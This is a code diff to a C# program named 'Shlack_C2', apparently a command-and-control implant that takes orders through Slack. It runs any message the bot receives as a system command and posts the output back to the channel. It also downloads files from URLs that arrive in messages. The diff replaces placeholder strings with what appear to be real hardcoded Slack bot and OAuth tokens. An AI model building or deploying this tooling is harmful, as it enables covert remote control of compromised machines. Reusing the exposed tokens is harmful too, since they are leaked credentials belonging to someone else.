@@ -9,9 +9,9 @@ namespace Shlack_C2
     {
         static void Main(string[] args)
         {
-            string slack_token = "xoxb-TokenIsHERE"; //CHANGE THIS
-            string oauth_token = "xoxp-TokenIsHERE"; //CHANGE THIS
-        
+            string slack_token = "xoxb-749955415858-762302085828-K2y5DJfEia8skec01kxF7YOP"; //CHANGE THIS
+            string oauth_token = "xoxp-749955415858-751258289107-751295525843-0276cef079a987f29b61f4241fe0e4a0"; //CHANGE THIS
+
             string targetID = ""; //This is to only accept messages sent through the created channel. Otherwise, any message received by the bot is to be executed.
             ManualResetEventSlim clientReady = new ManualResetEventSlim(false);
             SlackSocketClient client = new SlackSocketClient(slack_token);
@@ -55,10 +55,10 @@ namespace Shlack_C2
                             {
                                 try
                                 {
-                                    //remoteUri = System.Uri.EscapeDataString(remoteUri);
                                     remoteUri = remoteUri.Replace(">", "");
                                     remoteUri = remoteUri.Replace("<", "");
                                     down.DownloadFile(@remoteUri, @fileName);
+                                    client.PostMessage(null, message.channel.ToString(), "Downloaded successfully.");
                                 }
                                 catch (Exception e)
                                 {
@@ -67,7 +67,7 @@ namespace Shlack_C2
                                 break;
                             }
 
-                        default:
+                        default: //Execute command if no keywords used
                             string output = Execute(message.text);
                             client.PostMessage(null, message.channel.ToString(), output);
                             break;
@@ -144,6 +144,7 @@ namespace Shlack_C2
 
             return edited;
         }
+
     }
 
 }
